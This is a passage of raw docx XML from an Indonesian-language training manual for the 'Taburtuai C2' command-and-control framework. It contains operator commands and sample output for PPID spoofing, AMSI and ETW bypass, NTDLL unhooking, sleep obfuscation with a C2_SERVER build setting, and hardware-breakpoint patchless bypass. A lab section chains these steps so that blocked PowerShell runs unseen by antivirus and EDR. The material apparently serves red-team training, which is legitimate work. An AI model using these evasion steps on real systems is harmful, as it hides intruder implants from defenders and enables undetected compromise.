        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --hidden \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>PPID Spoofing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>PPID (Parent Process ID) Spoofing membuat proses yang kita spawn terlihat seolah-olah di-launch oleh proses legitimate lain (misalnya explorer.exe atau svchost.exe). Ini mengacaukan process tree analysis oleh EDR.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Spawn cmd.exe dengan parent explorer.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>inject ppid &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --exe "C:\Windows\System32\cmd.exe" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --args "/c calc.exe" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --ppid-name explorer.exe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Spawn dengan parent PID spesifik</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>inject ppid &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --exe "C:\Windows\System32\powershell.exe" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --args "-enc &lt;B64&gt;" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --ppid 1234 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ℹ  Tanpa PPID spoofing, proses yang di-spawn oleh agent akan terlihat sebagai child dari proses agent itu sendiri — pola yang mudah dideteksi EDR.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 9 — EVASION &amp; BYPASS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Teknik evasion memungkinkan agent dan shellcode berjalan di lingkungan yang dilindungi AV/EDR. Taburtuai C2 mengimplementasikan berbagai bypass yang bekerja secara in-process (tidak butuh tool eksternal).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>AMSI Bypass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>AMSI (Antimalware Scan Interface) adalah Microsoft API yang di-hook oleh AV/EDR untuk memeriksa script (PowerShell, VBScript, dll) sebelum dieksekusi. Bypass AMSI memungkinkan menjalankan script yang normalnya diblokir.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Bypass AMSI di proses agent (in-process)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass amsi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Bypass AMSI di proses lain (remote process via PID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass amsi &lt;agent-id&gt; --pid 8844 --wait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w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [+] AMSI bypass applied successfully</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [i] AMSI scan interface patched in PID 8844</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>ETW Bypass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ETW (Event Tracing for Windows) digunakan oleh EDR untuk logging aktivitas process, network, dan file system. Bypass ETW mengurangi visibility EDR terhadap aktivitas agent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Bypass ETW di proses agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass etw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Bypass ETW di proses spesifik</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass etw &lt;agent-id&gt; --pid 8844 --wait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AMSI + ETW sekaligus (disarankan)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass amsi &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass etw  &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>NTDLL Unhooking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>EDR sering meng-hook fungsi NTDLL (syscall wrapper) untuk memantau API calls. Unhooking me-restore bytes original NTDLL dari disk atau KnownDLLs, menghapus hooks tersebut.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Unhook NTDLL (restore dari disk)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>evasion unhook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w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [+] NTDLL unhooked successfully</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [i] Restored 247 hooked functions from clean copy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Sleep Obfuscation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Saat agent sedang 'tidur' (menunggu beacon interval), memory agent bisa di-scan oleh AV. Sleep obfuscation meng-enkripsi memory agent selama sleep sehingga signature tidak terdeteksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Sleep obfuscation dengan durasi tertentu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>evasion sleep &lt;agent-id&gt; --duration 30 --wait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Aktifkan sleep masking permanen saat build</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C2_SERVER=http://IP:8080 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=Key \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  SLEEP_MASKING=true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Hardware Breakpoint (HWBP) — Patchless AMSI/ETW</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Teknik HWBP menggunakan debug register CPU (DR0-DR3) untuk intercept fungsi AMSI/ETW tanpa mengubah bytes memory — lebih stealth dari patch karena tidak meninggalkan IOC di memory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># AMSI bypass via hardware breakpoint (patchless)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>evasion hwbp set &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --addr 0x7FFE0000 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --register 0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ETW bypass via HWBP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>evasion hwbp set &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --addr 0x7FFE1000 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --register 1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Clear semua HWBP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>evasion hwbp clear &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 9.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  AMSI + ETW Bypass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Verifikasi bahwa PowerShell AMSI aktif (coba jalankan EICAR string).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "powershell -c 'AMSI Test String'" --method powershell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Terapkan AMSI bypass di agent process.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass amsi &lt;agent-id&gt;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Terapkan ETW bypass.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass etw &lt;agent-id&gt;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Unhook NTDLL untuk menghapus EDR hooks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>evasion unhook &lt;agent-id&gt; --wait</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Coba jalankan PowerShell command yang sebelumnya diblokir.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "powershell -c Get-Process" --method powershell --wait</w:t>
